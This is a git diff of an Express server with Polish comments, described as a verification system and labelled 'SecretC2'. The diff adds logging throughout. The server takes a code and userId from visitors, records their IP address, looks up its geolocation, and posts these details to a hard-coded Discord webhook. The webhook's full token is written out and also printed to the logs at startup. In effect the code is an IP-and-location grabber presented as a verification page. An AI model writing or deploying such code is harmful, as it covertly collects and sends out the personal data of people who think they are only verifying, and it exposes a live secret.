@@ -64,15 +64,13 @@ app.post('/api/register-code', (req, res) => {
     }
   }
   
+  console.log(`📝 Kod ${code} zarejestrowany dla ${userId}`);
   res.json({ success: true });
 });
 
-// Strona weryfikacji - TERAZ TYLKO KOD, ID Z LINKU
+// Strona weryfikacji - TYLKO KOD, ID Z LINKU
 app.get('/', (req, res) => {
   const { code, userId } = req.query;
-  
-  // Jeśli mamy userId w linku, zapiszmy go w polu ukrytym
-  const hasUserId = userId ? true : false;
   
   res.send(`
     <!DOCTYPE html>
@@ -267,13 +265,17 @@ app.post('/api/verify', async (req, res) => {
   const { code, userId } = req.body;
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   
+  console.log(`🔍 Próba weryfikacji: kod=${code}, userId=${userId}, ip=${clientIp}`);
+  
   if (!code || !userId) {
+    console.log('❌ Brak kodu lub userId');
     return res.json({ success: false, message: 'Brak kodu lub userId' });
   }
   
   // Sprawdź czy kod istnieje i jest ważny
   const stored = validCodes.get(code);
   if (!stored || stored.userId !== userId || stored.expires < Date.now()) {
+    console.log(`❌ Nieprawidłowy kod: ${code}`);
     return res.json({ success: false, message: 'Nieprawidłowy lub wygasły kod!' });
   }
   
@@ -282,10 +284,13 @@ app.post('/api/verify', async (req, res) => {
   
   // Pobierz info o IP
   const ipInfo = await getIPInfo(clientIp);
+  console.log(`🌐 Info o IP: ${JSON.stringify(ipInfo)}`);
   
   // Wyślij log na Discorda przez webhook
   try {
-    await axios.post('https://discord.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z', {
+    const webhookUrl = 'https://discord.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z';
+    
+    const webhookData = {
       embeds: [{
         title: '✅ Nowa weryfikacja',
         color: 0x00ff00,
@@ -310,9 +315,16 @@ app.post('/api/verify', async (req, res) => {
         timestamp: new Date().toISOString(),
         footer: { text: 'SecretC2 - System weryfikacji' }
       }]
-    });
+    };
+    
+    const webhookResponse = await axios.post(webhookUrl, webhookData);
+    console.log(`✅ Webhook wysłany, status: ${webhookResponse.status}`);
   } catch(e) {
-    console.error('Błąd webhooka:', e.message);
+    console.error('❌ BŁĄD WEBHOOKA:', e.message);
+    if (e.response) {
+      console.error('Status błędu:', e.response.status);
+      console.error('Dane błędu:', e.response.data);
+    }
   }
   
   res.json({ 
@@ -324,4 +336,5 @@ app.post('/api/verify', async (req, res) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`🚀 Serwer weryfikacji działa na porcie ${PORT}`);
+  console.log(`🌐 Webhook URL: https://discord.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z`);
 });
